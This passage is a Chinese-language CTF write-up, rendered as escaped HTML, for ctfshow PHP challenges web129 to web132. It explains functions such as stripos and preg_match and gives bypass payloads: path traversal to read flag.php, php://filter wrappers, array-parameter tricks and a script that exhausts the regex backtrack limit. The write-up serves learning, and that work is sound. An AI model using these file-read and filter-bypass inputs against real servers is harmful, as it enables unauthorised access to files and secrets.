&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?f1=_&amp;amp;f2=get_defined_vars
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250812170416763.png&#34; alt=&#34;image-20250812170416763&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web129&#34;&gt;&lt;a href=&#34;#web129&#34; class=&#34;headerlink&#34; title=&#34;web129&#34;&gt;&lt;/a&gt;web129&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 03:18:40

*/


error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&amp;#39;f&amp;#39;]))&amp;#123;
    $f = $_GET[&amp;#39;f&amp;#39;];
    if(stripos($f, &amp;#39;ctfshow&amp;#39;)&amp;gt;0)&amp;#123;
        echo readfile($f);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;stripos()&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;基本语法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;stripos(string $haystack, string $needle, int $offset = 0): int|false
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;参数说明&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;$haystack&lt;/code&gt;&lt;strong&gt;：要搜索的&lt;/strong&gt;原字符串&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;$needle&lt;/code&gt;&lt;strong&gt;：要查找的&lt;/strong&gt;子串&lt;/strong&gt;（字符串或单个字符）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;$offset&lt;/code&gt;&lt;/strong&gt; *(可选)*：从哪个位置开始搜索（默认为 &lt;code&gt;0&lt;/code&gt;，即从头开始）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;返回值&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找到时 → 返回 &lt;strong&gt;第一次出现的位置&lt;/strong&gt;（从 &lt;code&gt;0&lt;/code&gt; 开始计数）。&lt;/li&gt;
&lt;li&gt;找不到时 → 返回 &lt;code&gt;false&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;⚠ &lt;strong&gt;注意&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;因为返回值可能是 &lt;code&gt;0&lt;/code&gt;（意味着子串在开头位置），判断是否找到应该用 &lt;code&gt;=== false&lt;/code&gt;，而不是 &lt;code&gt;== false&lt;/code&gt;，避免把位置 &lt;code&gt;0&lt;/code&gt; 误判成没找到。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;示例&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
$str = &amp;quot;Hello World!&amp;quot;;

// 大小写不敏感搜索
$pos1 = stripos($str, &amp;quot;world&amp;quot;);  // 返回 6
$pos2 = stripos($str, &amp;quot;WORLD&amp;quot;);  // 也返回 6

// 指定搜索起始位置
$pos3 = stripos($str, &amp;quot;o&amp;quot;, 5);   // 从位置 5 开始找，返回 7

// 搜索不到
$pos4 = stripos($str, &amp;quot;PHP&amp;quot;);    // 返回 false

var_dump($pos1, $pos2, $pos3, $pos4);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;输出&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;int(6)
int(6)
int(7)
bool(false)
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;strpos()&lt;/code&gt; 与 &lt;code&gt;stripos()&lt;/code&gt; 区别&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;函数&lt;/th&gt;
&lt;th&gt;区分大小写&lt;/th&gt;
&lt;th&gt;返回值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;strpos()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;第一次出现的位置 &amp;#x2F; false&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;stripos()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;第一次出现的位置 &amp;#x2F; false&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;常见坑&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;if (stripos(&amp;quot;hello&amp;quot;, &amp;quot;he&amp;quot;)) &amp;#123;
    echo &amp;quot;找到了&amp;quot;;
&amp;#125; else &amp;#123;
    echo &amp;quot;没找到&amp;quot;;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;❌ 这个会输出 **”没找到”**，因为返回 &lt;code&gt;0&lt;/code&gt; 被当成了 &lt;code&gt;false&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;✅ 正确写法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;if (stripos(&amp;quot;hello&amp;quot;, &amp;quot;he&amp;quot;) !== false) &amp;#123;
    echo &amp;quot;找到了&amp;quot;;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;因为 PHP 在处理文件路径时，并不会在每一步路径解析中都去检查“中间这个目录是否真实存在”，而是&lt;strong&gt;先对整个路径字符串做规范化处理（解析 &lt;code&gt;.&lt;/code&gt; 和 &lt;code&gt;..&lt;/code&gt;）&lt;/strong&gt;，然后再去一次性打开最终得到的实际路径。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;交给 &lt;code&gt;readfile&lt;/code&gt; 打开文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;readfile&lt;/code&gt; 内部先让 PHP 的路径解析器对路径规范化：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;&amp;quot;./ctfshow/../flag.php&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;→ 解析 &lt;code&gt;&amp;quot;.&amp;quot;&lt;/code&gt;（当前目录） → 无变化&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;→ 进入 &lt;code&gt;&amp;quot;ctfshow&amp;quot;&lt;/code&gt;（此时还没去访问磁盘）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;→ 遇到 &lt;code&gt;&amp;quot;..&amp;quot;&lt;/code&gt;，回退到上级目录（抵消了前面的 &lt;code&gt;ctfshow&lt;/code&gt;）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;→ 剩下 &lt;code&gt;&amp;quot;flag.php&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;最终得到的路径是 &lt;code&gt;&amp;quot;./flag.php&amp;quot;&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 &lt;code&gt;Unix/Linux&lt;/code&gt; 路径规范化过程中，&lt;code&gt;..&lt;/code&gt; 是&lt;strong&gt;纯字符串级别的路径消解&lt;/strong&gt;，它会直接在解析阶段把上一个路径段丢掉；&lt;/p&gt;
&lt;p&gt;只有最终得到的路径才会真正传给系统调用去访问文件（&lt;code&gt;fopen&lt;/code&gt;、&lt;code&gt;readfile&lt;/code&gt; 等）；&lt;/p&gt;
&lt;p&gt;所以不存在的 &lt;code&gt;ctfshow&lt;/code&gt; 永远不会被访问。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?f=/ctfshow/../../../../../../../../../var/www/html/flag.php

?f=./ctfshow/../flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250812171513924.png&#34; alt=&#34;image-20250812171513924&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;PHP 是“尝试附加每个 filter”——找不到的 filter 会失败但不致命&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在内部，PHP 为流附加 filter 的时候（等价于 &lt;code&gt;stream_filter_append()&lt;/code&gt;）会尝试定位这个 filter 名称；如果找不到，这个尝试会返回 &lt;code&gt;false&lt;/code&gt; 并触发一个 &lt;code&gt;E_WARNING&lt;/code&gt;（或在某些配置下写入服务器错误日志），但它并不会把整个 &lt;code&gt;readfile()&lt;/code&gt; 调用当场中止——之前成功附加的 filter 仍会处理数据，流仍会被读取输出。&lt;/p&gt;
&lt;p&gt;也就是说：&lt;code&gt;convert.base64-encode|ctfshow&lt;/code&gt;，如果 &lt;code&gt;convert.base64-encode&lt;/code&gt; 存在而 &lt;code&gt;ctfshow&lt;/code&gt; 不存在，Base64 仍会被应用，&lt;code&gt;ctfshow&lt;/code&gt; 的失败只产生日志&amp;#x2F;警告（可被 &lt;code&gt;error_reporting(0)&lt;/code&gt; 隐藏）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php
?f=php://filter/|ctfshow/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web130&#34;&gt;&lt;a href=&#34;#web130&#34; class=&#34;headerlink&#34; title=&#34;web130&#34;&gt;&lt;/a&gt;web130&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 05:19:40

*/


error_reporting(0);
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);
if(isset($_POST[&amp;#39;f&amp;#39;]))&amp;#123;
    $f = $_POST[&amp;#39;f&amp;#39;];

    if(preg_match(&amp;#39;/.+?ctfshow/is&amp;#39;, $f))&amp;#123;
        die(&amp;#39;bye!&amp;#39;);
    &amp;#125;
    if(stripos($f, &amp;#39;ctfshow&amp;#39;) === FALSE)&amp;#123;
        die(&amp;#39;bye!!&amp;#39;);
    &amp;#125;

    echo $flag;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;.+?&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.单独含义（按出现位置）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt;：原子，匹配&lt;strong&gt;任意单个字符&lt;/strong&gt;（默认不匹配换行，除非开了 &lt;code&gt;s&lt;/code&gt; 修饰符）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt;：量词，作用于&lt;strong&gt;前面的原子或分组&lt;/strong&gt;，表示“&lt;strong&gt;一次或多次&lt;/strong&gt;”（默认&lt;strong&gt;贪婪&lt;/strong&gt;，即尽可能多匹配）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?&lt;/code&gt;：语义依上下文而异&lt;/li&gt;
&lt;li&gt;如果直接跟在一个原子或分组后，&lt;code&gt;?&lt;/code&gt; 自身就是量词，表示“&lt;strong&gt;0 或 1&lt;/strong&gt;”（可选）。&lt;/li&gt;
&lt;li&gt;如果放在另一个量词后面（如 &lt;code&gt;*?&lt;/code&gt;、&lt;code&gt;+?&lt;/code&gt;、&lt;code&gt;??&lt;/code&gt;），它是&lt;strong&gt;将该量词改为懒惰（非贪婪）&lt;/strong&gt;的修饰符。&lt;/li&gt;
&lt;li&gt;还可以作为特殊结构的开头：&lt;code&gt;(?:&lt;/code&gt;、&lt;code&gt;(?=)&lt;/code&gt;、&lt;code&gt;(?i)&lt;/code&gt; 等。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2.&lt;code&gt;.+?&lt;/code&gt; 的精确含义（按顺序解释）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先看 &lt;code&gt;.&lt;/code&gt;：匹配任意字符（受 &lt;code&gt;s&lt;/code&gt; 的影响）。&lt;/li&gt;
&lt;li&gt;然后 &lt;code&gt;+&lt;/code&gt;：要求“至少 1 个任意字符”（且默认贪婪）。&lt;/li&gt;
&lt;li&gt;再跟 &lt;code&gt;?&lt;/code&gt;：这里 &lt;code&gt;?&lt;/code&gt; 是“量词修饰符”，把 &lt;code&gt;+&lt;/code&gt; 变成&lt;strong&gt;懒惰&lt;/strong&gt;。&lt;br&gt; → 整体 &lt;code&gt;.+?&lt;/code&gt; 就是 “匹配&lt;strong&gt;尽可能少&lt;/strong&gt;但至少 1 个任意字符，直到后面的模式能匹配为止”。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;3.与贪婪 &lt;code&gt;.+&lt;/code&gt; 的对比（用例说明）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$f = &amp;quot;abcctfshowdefctfshow&amp;quot;;
preg_match(&amp;#39;/.+?ctfshow/is&amp;#39;, $f, $m); // 懒惰
// $m[0] == &amp;quot;abcctfshow&amp;quot;  （匹配到第一个 ctfshow，前面尽可能少字符）

preg_match(&amp;#39;/.+ctfshow/is&amp;#39;, $f, $m);  // 贪婪
// $m[0] == &amp;quot;abcctfshowdefctfshow&amp;quot; （.+ 尽可能多，结果扩展到最后一个 ctfshow）
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;f=ctfshow
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250812182904181.png&#34; alt=&#34;image-20250812182904181&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;preg_match()&lt;/code&gt;  返回值有三种：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;0	                          	不匹配&lt;/strong&gt; &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;1		                          匹配一次&lt;/strong&gt; &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;FALSE	                     发生错误&lt;/strong&gt; &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对象如果是数组         返回FALSE&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;f=ctfshow[]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;stripos()&lt;/code&gt; 函数对数组不识别，遇到数组会返回 &lt;code&gt;NULL&lt;/code&gt; ，而 &lt;code&gt;NULL!=false&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;f[]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web131&#34;&gt;&lt;a href=&#34;#web131&#34; class=&#34;headerlink&#34; title=&#34;web131&#34;&gt;&lt;/a&gt;web131&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 05:19:40

*/


error_reporting(0);
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);
if(isset($_POST[&amp;#39;f&amp;#39;]))&amp;#123;
    $f = (String)$_POST[&amp;#39;f&amp;#39;];

    if(preg_match(&amp;#39;/.+?ctfshow/is&amp;#39;, $f))&amp;#123;
        die(&amp;#39;bye!&amp;#39;);
    &amp;#125;
    if(stripos($f,&amp;#39;36Dctfshow&amp;#39;) === FALSE)&amp;#123;
        die(&amp;#39;bye!!&amp;#39;);
    &amp;#125;

    echo $flag;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PHP 为了防止正则表达式的拒绝服务攻击（&lt;code&gt;reDOS&lt;/code&gt;），给 &lt;code&gt;pcre&lt;/code&gt; 设定了一个回溯次数上限 &lt;code&gt;pcre.backtrack_limit&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;回溯次数上限默认是 &lt;code&gt;100&lt;/code&gt; 万。如果回溯次数超过了 &lt;code&gt;100&lt;/code&gt; 万，&lt;code&gt;preg_match&lt;/code&gt; 将不再返回非 1 和 0，而是 &lt;code&gt;false&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;脚本发包&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
url = &amp;quot;http://dd25e9cd-a08b-4712-836f-fb8301295c99.challenge.ctf.show/&amp;quot;
data = &amp;#123;
    &amp;#39;f&amp;#39;: &amp;#39;very&amp;#39;*250000+&amp;#39;ctfshow&amp;#39;
&amp;#125;
res = requests.post(url=url,data=data)
print(res.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;直接生成需要的payload后POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
echo str_repeat(&amp;#39;very&amp;#39;, &amp;#39;250000&amp;#39;).&amp;#39;36Dctfshow&amp;#39;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250812220604649.png&#34; alt=&#34;image-20250812220604649&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web132&#34;&gt;&lt;a href=&#34;#web132&#34; class=&#34;headerlink&#34; title=&#34;web132&#34;&gt;&lt;/a&gt;web132&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 06:22:13
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 20:05:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

#error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);


if(isset($_GET[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;code&amp;#39;]))&amp;#123;
    $username = (String)$_GET[&amp;#39;username&amp;#39;];
    $password = (String)$_GET[&amp;#39;password&amp;#39;];
    $code = (String)$_GET[&amp;#39;code&amp;#39;];

    if($code === mt_rand(1,0x36D) &amp;amp;&amp;amp; $password === $flag || $username ===&amp;quot;admin&amp;quot;)&amp;#123;

        if($code == &amp;#39;admin&amp;#39;)&amp;#123;
            echo $flag;
        &amp;#125;

    &amp;#125;
&amp;#125;
